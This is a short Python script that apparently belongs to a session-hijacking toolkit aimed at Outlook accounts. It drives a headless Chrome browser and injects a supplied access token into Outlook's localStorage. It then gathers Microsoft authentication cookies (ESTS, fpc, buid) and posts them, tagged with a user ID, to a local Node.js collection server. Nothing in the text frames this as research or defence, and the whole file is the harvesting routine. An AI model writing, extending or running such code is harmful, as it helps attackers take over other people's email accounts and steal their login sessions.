from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
import requests
import time

def capture_outlook_cookies(user_id, access_token):
    try:
        # Setup headless Chrome
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        
        driver = webdriver.Chrome(options=chrome_options)
        
        # Navigate to Outlook
        driver.get("https://outlook.office.com")
        
        # Inject access token via JavaScript
        driver.execute_script(f"""
            localStorage.setItem('access_token', '{access_token}');
            window.location.reload();
        """)
        
        # Wait for cookies to be set
        time.sleep(5)
        
        # Get all cookies
        cookies = driver.get_cookies()
        
        # Filter authentication cookies
        auth_cookies = [c for c in cookies if 
                       'ESTS' in c['name'] or 
                       'fpc' in c['name'] or
                       'buid' in c['name']]
        
        # Send to Node.js server
        requests.post('http://localhost:8000/user/python-cookies', json={
            'userId': user_id,
            'cookies': auth_cookies
        })
        
        driver.quit()
        return len(auth_cookies)
        
    except Exception as e:
        print(f"Python capture error: {e}")
        return 0

if __name__ == "__main__":
    import sys
    user_id = sys.argv[1]
    access_token = sys.argv[2]
    count = capture_outlook_cookies(user_id, access_token)
    print(f"Captured {count} cookies")